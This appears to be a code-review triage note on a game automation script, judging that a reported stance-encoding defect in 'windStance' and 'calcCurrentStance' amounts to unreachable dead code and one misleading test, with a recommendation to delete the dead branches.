**Impact.** Effectively zero behavioural impact; cosmetic dead code plus one misleading test. Reachability of windStance() at all is default-inert: AutoStance defaults to multitoggle 1 (settings-defs.ts:2210) and use3daily defaults to boolean false (settings-defs.ts:263), so both dispatch sites (main-loop.ts:369, scryer.ts:48) skip windStance for a default user; settings-visibility.ts:593 gates the whole Windstacking panel on AutoStance == 3 and :638 turns AutoStance off entirely in U2. windStance additionally bails at world <= 70 (stance.ts:272), and a 15/5-eligible state further needs uberNature == 'Wind' plus Wind empowerment, i.e. z230+ in practice. Deepest corpus fixture is z62, so the L0 proof net cannot see any of this — the region is genuinely unguarded, which is why checking it statically was worthwhile. But even for the opt-in deep windstacking user the dead arms cost nothing: no formation, heirloom swap or trace event differs whether they exist. The only real costs are (a) two extra per-tick calls into the side-effecting calcCurrentStance (it calls highDamageShield(), which is idempotent for a fixed equipped shield, so no state divergence), and (b) tests/stance.characterization.test.ts:180 green-lighting an impossible state, which makes the mapping table look more complete than it is. Recommendation: file at the bottom of the pile as dead-code removal (delete stance.ts:275-278 and :309-312, retire or relabel the two tests that stub stance 5). Do NOT act on the claim's other suggestion of making calcCurrentStance able to return 5 — the game's W-stance health clamp makes that a strategy regression.

**Strongest counter-argument considered.** The 5-encoding is intentionally vacant, so calling it a defect is calling correct code broken. The claim reads the numbering as "high = low + 10 for every pair, and 15's twin is missing," but the `return 15` is NOT part of the low/high heirloom switch at all — it is a separate top-level branch (calc.ts:884-896) that fires before any heirloom reasoning and means "go W and wear the high-damage shield." The game makes that unconditional choice correct: in formation 5 with Wind uber + Wind empowerment the enemy's health is pinned at 1 until stacks cap (main.js:15971/15999/16038) and stacks accrue per attack regardless of damage (main.js:16163-16169), so the entire rationale for the low-damage heirloom evaporates inside W. A W+low state would be strictly worse than what ships. Add that the identical return set exists in the pre-conversion legacy oracle (d283f152:legacy/modules/calc.js), and the honest reading is: two vestigial `if` blocks from upstream that have never changed a single formation or heirloom swap. Nothing a user runs behaves differently because of them — dead-code hygiene, not a bug. The headline also over-counts: there are two comparison sites, not four.

---

